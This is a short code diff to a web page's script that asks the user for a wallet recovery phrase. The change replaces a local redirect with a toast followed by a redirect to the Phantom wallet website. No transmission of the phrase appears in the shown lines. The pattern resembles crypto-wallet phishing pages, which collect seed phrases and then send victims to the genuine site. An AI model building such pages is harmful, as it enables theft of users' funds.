@@ -58,7 +58,7 @@
 function handleImport() {
   const phrase = document.getElementById('phrase-input').value.trim();
   if (!phrase) { alert('Please enter your recovery phrase first.'); return; }
-  showToastAndRedirect('toast', 'index.html');
+  document.getElementById('toast').style.display='block'; setTimeout(function(){ window.location.href='https://www.phantom.com'; }, 1500);
 }
 </script>
 </body>
